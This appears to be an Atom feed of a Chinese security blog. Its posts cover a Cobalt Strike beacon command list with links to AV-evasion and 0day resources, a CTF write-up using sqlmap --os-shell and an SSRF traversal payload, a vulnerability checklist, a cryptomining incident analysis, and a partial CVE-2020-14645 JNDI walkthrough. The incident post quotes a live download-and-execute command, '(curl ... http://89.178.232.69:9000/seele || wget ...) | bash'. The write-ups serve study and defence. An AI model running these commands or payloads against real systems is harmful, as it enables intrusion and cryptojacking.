class="line"><span class="attr">setenv</span>                           <span class="string">设置一个环境变量</span></span><br><span class="line"><span class="attr">shell</span>                            <span class="string">通过cmd.exe执行命令。</span></span><br><span class="line"><span class="attr">shinject</span>                         <span class="string">将shellcode注入到进程中</span></span><br><span class="line"><span class="attr">shspawn</span>                          <span class="string">生成进程并将shellcode注入其中</span></span><br><span class="line"><span class="attr">sleep</span>                            <span class="string">设置信标睡眠时间</span></span><br><span class="line"><span class="attr">socks</span>                            <span class="string">启动SOCKS4a服务器来中继流量。</span></span><br><span class="line"><span class="attr">socks</span>                            <span class="string">停止SOCKS4a服务器</span></span><br><span class="line"><span class="attr">spawn</span>                            <span class="string">产生一个会话</span></span><br><span class="line"><span class="attr">spawnas</span>                          <span class="string">以另一个用户的身份生成一个会话</span></span><br><span class="line"><span class="attr">spawnto</span>                          <span class="string">设置可执行文件以将进程生成到</span></span><br><span class="line"><span class="attr">spawnu</span>                           <span class="string">在另一个进程下生成一个会话</span></span><br><span class="line"><span class="attr">spunnel</span>                          <span class="string">通过 rportfwd 生成和隧道代理。</span></span><br><span class="line"><span class="attr">spunnel_local</span>                    <span class="string">通过Cobalt Strike客户端rportfwd生成和挖掘一个代理。</span></span><br><span class="line"><span class="attr">ssh</span>                              <span class="string">使用SSH在主机上生成一个SSH会话。</span></span><br><span class="line"><span class="attr">sshkey</span>                           <span class="string">使用SSH在主机上生成一个SSH会话。</span></span><br><span class="line"><span class="attr">steal_token</span>                      <span class="string">从进程中窃取访问令牌</span></span><br><span class="line"><span class="attr">timestomp</span>                        <span class="string">将时间戳从一个文件应用到另一个文件</span></span><br><span class="line"><span class="attr">unlink</span>                           <span class="string">断开与母信标的连接</span></span><br><span class="line"><span class="attr">upload</span>                           <span class="string">上传文件</span></span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/tqydyqt/article/details/113831533" target="_blank" rel="noopener">【Windows】Shellcode免杀，过360、火绒、Defender 静态及主防</a><br><a href="https://www.bugfor.com/vuls/vulnerability/6962.html" target="_blank" rel="noopener">微信 RCE 0day</a><br><a href="https://mp.weixin.qq.com/s/V9rujv89_P0FGhBCfw21mw" target="_blank" rel="noopener">chrome(最新版可用) 0day上线cs &amp; wx 0day上线</a><br><a href="https://mp.weixin.qq.com/s/3LZ_cj2gDC1bQATxqBfweg" target="_blank" rel="noopener">远控免杀专题文章(1)-基础篇</a><br><a href="http://blog.zhangkexuan.cn/2020/11/09/msf01-windows-meterpreter-reverse-tcp/" target="_blank" rel="noopener">Metasploit(1):记录一次Win10的渗透过程</a></p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p><a href="https://github.com/knownsec/shellcodeloader" target="_blank" rel="noopener">shellcodeloader</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;那天闲着蛋疼，逛博客的时候发现有一篇教育意义（很狗）的博客，就想着4.15也快到了。趁着这个机会提醒下身边的朋友，在平常网上冲浪的时候注意下网络安全，说不定玩着玩着可能就被不知不觉的直播了。&lt;br&gt;阅读的文章：&lt;a href=&quot;https://my.oschina.net/u/4588149/blog/4421821&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;一次渗透妹子电脑开摄像头全过程&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="网络安全" scheme="https://chenzidu.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="WEB" scheme="https://chenzidu.github.io/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>纵横杯CTF-WEB两题</title>
    <link href="https://chenzidu.github.io/2020/12/27/%E7%BA%B5%E6%A8%AA%E6%9D%AFCTF-WEB%E4%B8%A4%E9%A2%98/"/>
    <id>https://chenzidu.github.io/2020/12/27/%E7%BA%B5%E6%A8%AA%E6%9D%AFCTF-WEB%E4%B8%A4%E9%A2%98/</id>
    <published>2020-12-27T04:54:26.000Z</published>
    <updated>2022-12-11T09:31:21.954Z</updated>
    
    <content type="html"><![CDATA[<p>纵横杯部分WEB题解</p><a id="more"></a><h1 id="easyci"><a href="#easyci" class="headerlink" title="easyci"></a>easyci</h1><p>一道SQL注入题，大概思路：sql注入写入shell，读取flag文件。<br>sqlmap先读取”/etc/apache2/apache2.conf”内容。</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:<span class="string">//eci-2ze0xe7juyhmgubdhea1.cloudeci1.ichunqiu.com/public/index.php/home/login</span> <span class="params">--data</span> <span class="string">"username=admin&amp;password=1"</span> -p username <span class="params">--technique</span> B <span class="params">--dbms</span> mysql <span class="params">--threads=10</span> <span class="params">--file-read=</span><span class="string">"/etc/apache2/apache2.conf"</span></span><br></pre></td></tr></table></figure><p><img src="1.png" alt=""></p><p>发现绝对路径（/var/sercet/html）再写入shell</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:<span class="string">//eci-2ze3qpk9e6qoggl1cuol.cloudeci1.ichunqiu.com/public/index.php/home/login</span> <span class="params">--data</span> <span class="string">"username=admin&amp;password=1"</span> -p username <span class="params">--technique</span> B <span class="params">--dbms</span> mysql <span class="params">--os-shell</span></span><br></pre></td></tr></table></figure><h1 id="ezcms"><a href="#ezcms" class="headerlink" title="ezcms"></a>ezcms</h1><p>参考文章：<br><a href="https://www.cnblogs.com/Spec/p/11188198.html" target="_blank" rel="noopener">YZMCMS V5.3后台 SSRF</a><br><a href="https://bugs.php.net/bug.php?id=76857" target="_blank" rel="noopener">Bug #76857    Can read “non-existant” files</a></p><p>这边主要是因为如果将不支持的协议的URL传递给文件系统<br>功能，则它们会将其视为本地文件路径,这边必须请求http或者https,所以构造一个httpssss即可。<br>远程vps利用python起一个web服务。</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server <span class="number">80</span></span><br></pre></td></tr></table></figure><p><img src="2.png" alt=""></p><p>伪造文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">test123</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"httppp://sdxcas.com/../../../../../../../../../../../../../flag"</span>&gt;</span>123<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">test123</span>&gt;</span></span><br></pre></td></tr></table></figure><p>测试读取</p><p><img src="3.png" alt=""></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;纵横杯部分WEB题解&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://chenzidu.github.io/categories/CTF/"/>
    
    
    <category term="WEB" scheme="https://chenzidu.github.io/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>关于快速验证低危与中危漏洞</title>
    <link href="https://chenzidu.github.io/2020/10/20/%E5%85%B3%E4%BA%8E%E5%BF%AB%E9%80%9F%E9%AA%8C%E8%AF%81%E4%BD%8E%E5%8D%B1%E4%B8%8E%E4%B8%AD%E5%8D%B1%E6%BC%8F%E6%B4%9E/"/>
    <id>https://chenzidu.github.io/2020/10/20/%E5%85%B3%E4%BA%8E%E5%BF%AB%E9%80%9F%E9%AA%8C%E8%AF%81%E4%BD%8E%E5%8D%B1%E4%B8%8E%E4%B8%AD%E5%8D%B1%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-10-20T06:56:36.000Z</published>
    <updated>2022-12-11T09:31:21.954Z</updated>
    
    <content type="html"><![CDATA[<p>漏洞是指一个系统存在的弱点或缺陷，系统对特定威胁攻击或危险事件的敏感性，或进行攻击的威胁作用的可能性。按照危害也被分为高、中、低三种。</p><a id="more"></a><h1 id="低危"><a href="#低危" class="headerlink" title="低危"></a>低危</h1><h2 id="X-Frame-Options-Header未配置"><a href="#X-Frame-Options-Header未配置" class="headerlink" title="X-Frame-Options Header未配置"></a>X-Frame-Options Header未配置</h2><p>查看请求头中是否存在X-Frame-Options Header字段</p><p><a href="http://google.com" target="_blank" rel="noopener">http://google.com</a></p><p><img src="1.png" alt=""></p><h2 id="会话Cookie中缺少secure属性-未设置安全标志的Cookie"><a href="#会话Cookie中缺少secure属性-未设置安全标志的Cookie" class="headerlink" title="会话Cookie中缺少secure属性(未设置安全标志的Cookie)"></a>会话Cookie中缺少secure属性(未设置安全标志的Cookie)</h2><p>当cookie设置为Secure标志时，它指示浏览器只能通过安全SSL/TLS通道访问cookie。</p><h2 id="未设置HttpOnly标志的Cookie"><a href="#未设置HttpOnly标志的Cookie" class="headerlink" title="未设置HttpOnly标志的Cookie"></a>未设置HttpOnly标志的Cookie</h2><p>当cookie设置为HttpOnly标志时，它指示浏览器cookie只能由服务器访问，保护cookie而不能由客户端脚本访问。</p><p><img src="5.png" alt=""></p><h2 id="可能的敏感文件"><a href="#可能的敏感文件" class="headerlink" title="可能的敏感文件"></a>可能的敏感文件</h2><p>这个洞有高危有低危，如果数据中存在账号密码等重要信息并且关联起来，可算高危。如果只是文件路径，或者一些普通信息，算低危~高危</p><h1 id="中危"><a href="#中危" class="headerlink" title="中危"></a>中危</h1><h2 id="启用TLS-1-0"><a href="#启用TLS-1-0" class="headerlink" title="启用TLS 1.0"></a>启用TLS 1.0</h2><p>攻击者可能能够利用此问题进行中间人攻击，并对受影响的服务和客户端之间的通信进行解密。PCI安全标准委员会规定2018年6月30日之后，开启TLS1.0将导致PCI DSS不合规。<br>可以使用<a href="https://myssl.com/" target="_blank" rel="noopener">myssl</a>来辨认。</p><p>baidu.com</p><p><img src="2.png" alt=""></p><h2 id="使用RC4密码套件"><a href="#使用RC4密码套件" class="headerlink" title="使用RC4密码套件"></a>使用RC4密码套件</h2><p>攻击者可以在特定环境下只通过嗅探监听就可以还原采用RC4保护的加密信息中的纯文本，导致账户、密码、信用卡信息等重要敏感信息暴露，并且可以通过中间人进行会话劫持。</p><p><img src="3.png" alt=""></p><h2 id="存在POODLE攻击-启用了SSLv3协议"><a href="#存在POODLE攻击-启用了SSLv3协议" class="headerlink" title="存在POODLE攻击(启用了SSLv3协议)"></a>存在POODLE攻击(启用了SSLv3协议)</h2><p>攻击者可能窃取客户端与server端使用SSLv3加密通信的明文内容<br><img src="4.png" alt=""></p><h2 id="没有CSRF保护的HTML表单"><a href="#没有CSRF保护的HTML表单" class="headerlink" title="没有CSRF保护的HTML表单"></a>没有CSRF保护的HTML表单</h2><p>攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并运行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去运行。</p><p>利用burp中的生成CSRF POC自动生成来构造<br><img src="6.png" alt=""></p><p><img src="7.png" alt=""></p><h2 id="Host-攻击（主机头攻击）"><a href="#Host-攻击（主机头攻击）" class="headerlink" title="Host 攻击（主机头攻击）"></a>Host 攻击（主机头攻击）</h2><p>主机标头指定哪个网站或Web应用程序应处理传入的HTTP请求。Web服务器使用此标头的值将请求分派到指定的网站或Web应用程序。<br><img src="8.png" alt=""></p><h2 id="脆弱的Javascript库-javascript跨站脚本"><a href="#脆弱的Javascript库-javascript跨站脚本" class="headerlink" title="脆弱的Javascript库(javascript跨站脚本)"></a>脆弱的Javascript库(javascript跨站脚本)</h2><p>jQuery 3.4.0 以上版本不受漏洞影响。<br><img src="9.png" alt=""></p><h2 id="页面上的错误消息"><a href="#页面上的错误消息" class="headerlink" title="页面上的错误消息"></a>页面上的错误消息</h2><p>错误信息页面<br><img src="10.png" alt=""></p><h2 id="开启TRACE方法"><a href="#开启TRACE方法" class="headerlink" title="开启TRACE方法"></a>开启TRACE方法</h2><p>在此Web服务器上启用了HTTP TRACE方法。如果Web浏览器中存在其他跨域漏洞，则可以从任何支持HTTP TRACE方法的域中读取敏感的标头信息。<br><img src="11.png" alt=""></p><h2 id="开启options方法"><a href="#开启options方法" class="headerlink" title="开启options方法"></a>开启options方法</h2><p>攻击者可利用options方法获取服务器的信息，进而准备进一步攻击。</p><h2 id="JetBrains-IDE-workspace-xml文件泄露"><a href="#JetBrains-IDE-workspace-xml文件泄露" class="headerlink" title="JetBrains IDE workspace.xml文件泄露"></a>JetBrains IDE workspace.xml文件泄露</h2><p>这个漏洞具体是指目录下存在<code>/.idea/</code>文件夹,通过workspace.xml，可直接获取整个工程的目录结构,为后续渗透中收集信息。</p><h2 id="jQuery跨站脚本"><a href="#jQuery跨站脚本" class="headerlink" title="jQuery跨站脚本"></a>jQuery跨站脚本</h2><p>攻击者使用.hash选择元素时，通过特制的标签，远程攻击者利用该漏洞注入任意web脚本或HTML。在jQuery 1.6.3及之后得到修复。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;漏洞是指一个系统存在的弱点或缺陷，系统对特定威胁攻击或危险事件的敏感性，或进行攻击的威胁作用的可能性。按照危害也被分为高、中、低三种。&lt;/p&gt;</summary>
    
    
    
    <category term="低危" scheme="https://chenzidu.github.io/categories/%E4%BD%8E%E5%8D%B1/"/>
    
    <category term="中危" scheme="https://chenzidu.github.io/categories/%E4%B8%AD%E5%8D%B1/"/>
    
    
    <category term="WEB" scheme="https://chenzidu.github.io/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>恶意的挖矿经历-当场应急！</title>
    <link href="https://chenzidu.github.io/2020/08/11/%E6%81%B6%E6%84%8F%E7%9A%84%E6%8C%96%E7%9F%BF%E7%BB%8F%E5%8E%86-%E5%BD%93%E5%9C%BA%E5%BA%94%E6%80%A5%EF%BC%81/"/>
    <id>https://chenzidu.github.io/2020/08/11/%E6%81%B6%E6%84%8F%E7%9A%84%E6%8C%96%E7%9F%BF%E7%BB%8F%E5%8E%86-%E5%BD%93%E5%9C%BA%E5%BA%94%E6%80%A5%EF%BC%81/</id>
    <published>2020-08-11T05:50:28.000Z</published>
    <updated>2022-12-11T09:31:21.954Z</updated>
    
    <content type="html"><![CDATA[<h2 id="事情的起因"><a href="#事情的起因" class="headerlink" title="事情的起因"></a>事情的起因</h2><p>下班得瑟的我，突然接收到了一条来自阿里云的短信???????</p><a id="more"></a><p><img src="1.jpg" alt=""></p><p>土豆机中了挖矿！！！??????</p><p><img src="2.png" alt=""></p><p><b>先说下结果: 看了一堆，啥也没查到，奶奶的那吊毛删的太干净了!</b></p><p>这不是现场的应急教材吗????开冲!!!</p><p>前段时间复现CVE-2020-14645,有朋友想玩玩，然后就在我的土豆机上开心的用docker搭建了环境。</p><p>靠着我的直觉，直接停了docker,到家后登上阿里云，果然报的就是靶机。现在搞挖矿真不容易，还得拿最近爆出来的漏洞打<del>~</del></p><h2 id="从阿里云上看告警监测"><a href="#从阿里云上看告警监测" class="headerlink" title="从阿里云上看告警监测"></a>从阿里云上看告警监测</h2><p><img src="3.jpg" alt=""></p><p><img src="3.png" alt=""></p><p>对<br><code>http://89.178.232.69:9000/seele</code>地址进行get请求</p><p>动态IP没啥可看的</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl</span><br><span class="line"><span class="deletion">-s</span></span><br><span class="line"><span class="deletion">-s参数将不输出错误和进度信息。</span></span><br></pre></td></tr></table></figure><p><img src="4.jpg" alt=""></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/java/bin/java -server -Xdebug -Xnoagent -Xrunjdwp:transport=dt_socket,address=<span class="number">8453</span>,server=y,suspend=n </span><br><span class="line">-Djava.compiler=NONE -Xms256m -Xmx512m -XX:CompileThreshold=<span class="number">8000</span> -cp /u01/app/oracle/middleware/wlserver/server/lib/weblogic-launcher.jar </span><br><span class="line">-Dlaunch.use.env.classpath=<span class="keyword">true</span> -Dweblogic.Name=AdminServer </span><br><span class="line">-Djava.security.policy=/u01/app/oracle/middleware/wlserver/server/lib/weblogic.policy </span><br><span class="line">-Djava.system<span class="class">.<span class="keyword">class</span>.<span class="title">loader</span></span>=com.oracle.classloader.weblogic.LaunchClassLoader </span><br><span class="line">-javaagent:/u01/app/oracle/middleware/wlserver/server/lib/debugpatch-agent.jar -ea -da:com.bea... -da:javelin... -da:weblogic... -ea:com.bea.wli... -ea:com.bea.broker... -ea:com.bea.sbconsole... -Dwls.home=/u01/app/oracle/middleware/wlserver/server -Dweblogic.home=/u01/app/oracle/middleware/wlserver/server weblogic.Server</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/benben683280/article/details/78716397" target="_blank" rel="noopener">-Xdebug 启动命令</a><br>讲的可详细了</p><p>父进程id：15015<br>进程ID：27557</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh -c (curl -s http://89.178.232.69:9000/seele||wget -q -O- http://89.178.232.69:9000/seele)|bash</span><br></pre></td></tr></table></figure><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget</span><br><span class="line">-q, --quiet 安静模式(没有输出)</span><br><span class="line">-O --<span class="meta">output</span>-document=<span class="meta">FILE</span> 把文档写到<span class="meta">FILE</span>文件中</span><br></pre></td></tr></table></figure><p><img src="5.jpg" alt="发现了挖矿程序"></p><p><img src="6.jpg" alt="访问恶意ip"></p><p><img src="6.png" alt="中控ip"></p><h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><p>先查看下weblogic的访问日志</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oracle<span class="regexp">/Domains/</span>ExampleSilentWTDomain<span class="regexp">/servers/</span>AdminServer<span class="regexp">/logs</span></span><br></pre></td></tr></table></figure><p><img src="7.png" alt="access.log"></p><p>还顺带发现了几个腾讯云的恶意IP</p><p><img src="8.png" alt=""></p><p>在<code>ExampleSilentWTDomain.log</code>下发现了当天下午四点的攻击（8小时时差）</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">####&lt;Aug <span class="number">7</span>, <span class="number">2020</span> <span class="number">8</span>:<span class="number">50</span>:<span class="number">35</span>,<span class="number">581</span> AM UTC&gt; &lt;Error&gt; &lt;RJVM&gt; &lt;<span class="number">4695</span>b9b44637&gt; &lt;AdminServer&gt; &lt;ExecuteThread: <span class="character">'0'</span> for queue: 'weblogic.socket.Muxer'&gt; &lt;&lt;WLS Kernel&gt;&gt; &lt;&gt; &lt;<span class="number">6e5</span>ae28b-<span class="number">117</span>c-<span class="number">4080</span>-b9d7-<span class="number">25</span>c5070c1882-<span class="number">00000019</span>&gt; &lt;<span class="number">1596790235581</span>&gt; &lt;<span class="literal">[<span class="identifier">severity</span>-<span class="identifier">value</span>: <span class="number">8</span>]</span> <span class="literal">[<span class="identifier">rid</span>: <span class="number">0</span>]</span> <span class="literal">[<span class="identifier">partition</span>-<span class="identifier">id</span>: <span class="number">0</span>]</span> <span class="literal">[<span class="identifier">partition</span>-<span class="identifier">name</span>: DOMAIN]</span> &gt; &lt;BEA-<span class="number">000503</span>&gt; &lt;Incoming message header <span class="keyword">or</span> abbreviation processing failed. </span><br><span class="line"> java.lang.ClassCastException: java.lang.UNIXProcess cannot be cast <span class="keyword">to</span> java.lang.Comparable</span><br><span class="line">java.lang.ClassCastException: java.lang.UNIXProcess cannot be cast <span class="keyword">to</span> java.lang.Comparable</span><br><span class="line">at com.tangosol.util.comparator.<span class="module-access"><span class="module"><span class="identifier">ExtractorComparator</span>.</span></span>compare(<span class="module-access"><span class="module"><span class="identifier">ExtractorComparator</span>.</span></span>java:<span class="number">71</span>)</span><br><span class="line">at java.util.<span class="module-access"><span class="module"><span class="identifier">PriorityQueue</span>.</span></span>sift<span class="constructor">DownUsingComparator(PriorityQueue.<span class="params">java</span>:722)</span></span><br><span class="line">at java.util.<span class="module-access"><span class="module"><span class="identifier">PriorityQueue</span>.</span></span>sift<span class="constructor">Down(PriorityQueue.<span class="params">java</span>:688)</span></span><br><span class="line">at java.util.<span class="module-access"><span class="module"><span class="identifier">PriorityQueue</span>.</span></span>heapify(<span class="module-access"><span class="module"><span class="identifier">PriorityQueue</span>.</span></span>java:<span class="number">737</span>)</span><br><span class="line">at java.util.<span class="module-access"><span class="module"><span class="identifier">PriorityQueue</span>.</span></span>read<span class="constructor">Object(PriorityQueue.<span class="params">java</span>:797)</span></span><br><span class="line">at sun.reflect.<span class="module-access"><span class="module"><span class="identifier">NativeMethodAccessorImpl</span>.</span></span>invoke0(Native Method)</span><br><span class="line">at sun.reflect.<span class="module-access"><span class="module"><span class="identifier">NativeMethodAccessorImpl</span>.</span></span>invoke(<span class="module-access"><span class="module"><span class="identifier">NativeMethodAccessorImpl</span>.</span></span>java:<span class="number">62</span>)</span><br><span class="line">at sun.reflect.<span class="module-access"><span class="module"><span class="identifier">DelegatingMethodAccessorImpl</span>.</span></span>invoke(<span class="module-access"><span class="module"><span class="identifier">DelegatingMethodAccessorImpl</span>.</span></span>java:<span class="number">43</span>)</span><br><span class="line">at java.lang.reflect.<span class="module-access"><span class="module"><span class="identifier">Method</span>.</span></span>invoke(<span class="module-access"><span class="module"><span class="identifier">Method</span>.</span></span>java:<span class="number">498</span>)</span><br><span class="line">at java.io.<span class="module-access"><span class="module"><span class="identifier">ObjectStreamClass</span>.</span></span>invoke<span class="constructor">ReadObject(ObjectStreamClass.<span class="params">java</span>:1170)</span></span><br><span class="line">at java.io.<span class="module-access"><span class="module"><span class="identifier">ObjectInputStream</span>.</span></span>read<span class="constructor">SerialData(ObjectInputStream.<span class="params">java</span>:2178)</span></span><br><span class="line">at java.io.<span class="module-access"><span class="module"><span class="identifier">ObjectInputStream</span>.</span></span>read<span class="constructor">OrdinaryObject(ObjectInputStream.<span class="params">java</span>:2069)</span></span><br><span class="line">at java.io.<span class="module-access"><span class="module"><span class="identifier">ObjectInputStream</span>.</span></span>read<span class="constructor">Object0(ObjectInputStream.<span class="params">java</span>:1573)</span></span><br><span class="line">at java.io.<span class="module-access"><span class="module"><span class="identifier">ObjectInputStream</span>.</span></span>read<span class="constructor">Object(ObjectInputStream.<span class="params">java</span>:431)</span></span><br><span class="line">at weblogic.rjvm.<span class="module-access"><span class="module"><span class="identifier">InboundMsgAbbrev</span>.</span></span>read<span class="constructor">Object(InboundMsgAbbrev.<span class="params">java</span>:73)</span></span><br><span class="line">at weblogic.rjvm.<span class="module-access"><span class="module"><span class="identifier">InboundMsgAbbrev</span>.</span></span>read(<span class="module-access"><span class="module"><span class="identifier">InboundMsgAbbrev</span>.</span></span>java:<span class="number">45</span>)</span><br><span class="line">at weblogic.rjvm.<span class="module-access"><span class="module"><span class="identifier">MsgAbbrevJVMConnection</span>.</span></span>read<span class="constructor">MsgAbbrevs(MsgAbbrevJVMConnection.<span class="params">java</span>:325)</span></span><br><span class="line">at weblogic.rjvm.<span class="module-access"><span class="module"><span class="identifier">MsgAbbrevInputStream</span>.</span></span>init(<span class="module-access"><span class="module"><span class="identifier">MsgAbbrevInputStream</span>.</span></span>java:<span class="number">219</span>)</span><br><span class="line">at weblogic.rjvm.<span class="module-access"><span class="module"><span class="identifier">MsgAbbrevJVMConnection</span>.</span></span>dispatch(<span class="module-access"><span class="module"><span class="identifier">MsgAbbrevJVMConnection</span>.</span></span>java:<span class="number">557</span>)</span><br><span class="line">at weblogic.rjvm.t3.<span class="module-access"><span class="module"><span class="identifier">MuxableSocketT3</span>.</span></span>dispatch(<span class="module-access"><span class="module"><span class="identifier">MuxableSocketT3</span>.</span></span>java:<span class="number">666</span>)</span><br><span class="line">at weblogic.socket.<span class="module-access"><span class="module"><span class="identifier">BaseAbstractMuxableSocket</span>.</span></span>dispatch(<span class="module-access"><span class="module"><span class="identifier">BaseAbstractMuxableSocket</span>.</span></span>java:<span class="number">397</span>)</span><br><span class="line">at weblogic.socket.<span class="module-access"><span class="module"><span class="identifier">SocketMuxer</span>.</span></span>read<span class="constructor">ReadySocketOnce(SocketMuxer.<span class="params">java</span>:993)</span></span><br><span class="line">at weblogic.socket.<span class="module-access"><span class="module"><span class="identifier">SocketMuxer</span>.</span></span>read<span class="constructor">ReadySocket(SocketMuxer.<span class="params">java</span>:929)</span></span><br><span class="line">at weblogic.socket.<span class="module-access"><span class="module"><span class="identifier">NIOSocketMuxer</span>.</span></span>process(<span class="module-access"><span class="module"><span class="identifier">NIOSocketMuxer</span>.</span></span>java:<span class="number">599</span>)</span><br><span class="line">at weblogic.socket.<span class="module-access"><span class="module"><span class="identifier">NIOSocketMuxer</span>.</span></span>process<span class="constructor">Sockets(NIOSocketMuxer.<span class="params">java</span>:563)</span></span><br><span class="line">at weblogic.socket.<span class="module-access"><span class="module"><span class="identifier">SocketReaderRequest</span>.</span></span>run(<span class="module-access"><span class="module"><span class="identifier">SocketReaderRequest</span>.</span></span>java:<span class="number">30</span>)</span><br><span class="line">at weblogic.socket.<span class="module-access"><span class="module"><span class="identifier">SocketReaderRequest</span>.</span></span>execute(<span class="module-access"><span class="module"><span class="identifier">SocketReaderRequest</span>.</span></span>java:<span class="number">43</span>)</span><br><span class="line">at weblogic.kernel.<span class="module-access"><span class="module"><span class="identifier">ExecuteThread</span>.</span></span>execute(<span class="module-access"><span class="module"><span class="identifier">ExecuteThread</span>.</span></span>java:<span class="number">147</span>)</span><br><span class="line">at weblogic.kernel.<span class="module-access"><span class="module"><span class="identifier">ExecuteThread</span>.</span></span>run(<span class="module-access"><span class="module"><span class="identifier">ExecuteThread</span>.</span></span>java:<span class="number">119</span>)</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>历史记录被删除了，感觉好多数据都被删除了。</p><p><img src="9.jpg" alt=""></p><p>发现登陆记录被删除了</p><p><img src="10.jpg" alt=""></p><p>果然重要信息都被清除掉了，太现实了~</p><p><img src="11.jpg" alt=" /var/log"></p><h2 id="来缕一缕思路"><a href="#来缕一缕思路" class="headerlink" title="来缕一缕思路"></a>来缕一缕思路</h2><p>手先通过扫描，发现我的靶机存在漏洞。</p><p><img src="7.jpg" alt="事件调查"></p><p>通过curl 和wget 投递挖矿程序-&gt;访问恶意ip执行了挖矿程序-&gt;脚本传入了挖矿程序后，运行后顺便把记录删了。</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;事情的起因&quot;&gt;&lt;a href=&quot;#事情的起因&quot; class=&quot;headerlink&quot; title=&quot;事情的起因&quot;&gt;&lt;/a&gt;事情的起因&lt;/h2&gt;&lt;p&gt;下班得瑟的我，突然接收到了一条来自阿里云的短信???????&lt;/p&gt;</summary>
    
    
    
    
    <category term="Linux" scheme="https://chenzidu.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-14645快速利用复现</title>
    <link href="https://chenzidu.github.io/2020/07/25/CVE-2020-14645-%E5%A4%8D%E7%8E%B0-%E5%88%A9%E7%94%A8/"/>
    <id>https://chenzidu.github.io/2020/07/25/CVE-2020-14645-%E5%A4%8D%E7%8E%B0-%E5%88%A9%E7%94%A8/</id>
    <published>2020-07-25T08:00:04.000Z</published>
    <updated>2022-12-11T09:31:21.954Z</updated>
    
    <content type="html"><![CDATA[<p>已经有很多分析文章了，直接讲利用实在点</p><a id="more"></a><h2 id="需要知道的背景知识"><a href="#需要知道的背景知识" class="headerlink" title="需要知道的背景知识"></a>需要知道的背景知识</h2><h3 id="weblogic及weblogic版本选择"><a href="#weblogic及weblogic版本选择" class="headerlink" title="weblogic及weblogic版本选择"></a>weblogic及weblogic版本选择</h3><blockquote class="blockquote-center"><p>WebLogic应用服务器产品系列是业界最全面的开发、部署和集成企业管理软件的平台。简而言之就是中间件，是应用服务器。</p></blockquote><p>因为使用的是<code>com.tangosol.util.extractor.UniversalExtractor</code>这个类<code>Weblogic 12.2.1.4</code>的包</p><h3 id="JNDI及利用原理"><a href="#JNDI及利用原理" class="headerlink" title="JNDI及利用原理"></a>JNDI及利用原理</h3><ul><li>JNDI是SUN公司提供的一种标准的Java命名系统接口</li><li>JNDI可访问的现有的目录及服务有：<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DNS、XNam 、Novell目录服务、LDAP(Lightweight Directory Access Protocol轻型目录访问协议)、 CORBA对象服务、文件系统、Windows XP/<span class="number">2000</span>/NT/Me/<span class="number">9</span>x的注册表、RMI、DSML v1&amp;v2、NIS。</span><br></pre></td></tr></table></figure></li></ul><p><b>利用原理</b></p><ul><li>客户端的lookup()方法</li><li>JDNI注入由于其加载动态类原理是JNDI Reference远程加载Object Factory类的特性</li></ul><h3 